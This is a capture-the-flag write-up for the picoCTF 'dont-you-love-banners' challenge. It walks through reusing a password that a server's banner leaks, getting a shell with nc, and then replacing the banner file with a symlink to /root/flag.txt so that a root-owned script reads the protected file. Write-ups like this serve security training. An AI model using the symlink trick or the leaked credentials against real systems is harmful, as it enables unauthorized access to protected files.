# Description ðŸ“„

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 64611`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 57294`. From the above information abuse the machine and find the flag in the `/root` directory.

# Method_1 ðŸ§ª

- In challenge description it says that "server has been leaking crucial information", so lets connect to server

```bash
telnet tethys.picoctf.net 64611
```

```password
My_Passw@rd_@1234
```

- We get the password. Now lets go to next step (connecting using `nc`)

```bash
nc tethys.picoctf.net 57294
```

- After typing the password and googling for some questions, we are granted **shell** access

- If we do `ls` and check the files we find the **banner** that we were greeted with when connected using `nc` is in `banner` file and a file called `text` which is clearly there to mock us

- We know that the flag is in `/root` so if we go in there and do `ls`, we'll see `flag.txt` which we can't read but there is also a python script called `script.py` which is readable by anyone

![picoCTF_dont-you-love-banners_img4](https://imgur.com/sFl4pGX.png)

- Since the script is owned by **root** we know only root can execute it and after reading the script we get to know that it displays banner from `/home/player/banner`. So one can be that we delete the banner file and make a **system link** to `/root/flag.txt` so that when we log in again the **flag** gets displayed instead of the original banner

```bash
rm /home/player/banner
```

```bash
ln -s /root/flag.txt /home/player/banner
```

```bash
# exit shell and login again
nc tethys.picoctf.net 63490
```
